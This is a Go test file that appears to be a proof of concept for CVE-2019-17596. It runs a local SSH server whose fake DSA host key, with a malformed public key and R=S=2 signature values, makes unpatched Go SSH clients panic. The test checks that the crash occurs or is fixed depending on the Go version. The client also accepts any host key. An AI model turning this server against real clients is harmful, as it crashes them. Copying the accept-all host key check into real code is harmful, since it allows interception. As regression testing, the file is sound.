package poc_dsa_verify_CVE_2019_17596

import (
	"fmt"
	"github.com/gliderlabs/ssh"
	"github.com/stretchr/testify/require"
	gossh "golang.org/x/crypto/ssh"
	"math/big"
	"net"
	"testing"
)

func TestSSHClientHostKey(t *testing.T) {
	port, err := getRandomPort()
	require.NoError(t, err)
	addr := fmt.Sprintf("127.0.0.1:%d", port)

	priv := examplePrivateKey()
	priv.PublicKey.Q.SetInt64(128)
	fs := &fakeSigner{
		R:      new(big.Int).SetInt64(2),
		S:      new(big.Int).SetInt64(2),
		public: priv.PublicKey,
	}

	sshSigner, err := gossh.NewSignerFromSigner(fs)
	require.NoError(t, err)
	s := &ssh.Server{
		Addr: addr,
		Handler: func(session ssh.Session) {
			defer session.Close()
			session.Write([]byte("hello world\n"))
		},
	}
	s.AddHostKey(sshSigner)
	ln, err := net.Listen("tcp", addr)
	require.NoError(t, err)
	defer ln.Close()
	go s.Serve(ln)

	clientConfig := &gossh.ClientConfig{
		HostKeyCallback: func(hostname string, remote net.Addr, key gossh.PublicKey) error {
			return nil
		},
	}

	tf := func() {
		conn, err := gossh.Dial("tcp", addr, clientConfig)
		require.NoError(t, err)
		defer conn.Close()
	}

	if isFixed(t) {
		t.Log("Using Go >= 1.13.2 -- SSH Client should work")
		require.NotPanics(t, tf)
	} else {
		t.Log("Using Go <= 1.13.2 -- SSH Client will panic and test will fail")
		require.Panics(t, tf)
	}

}
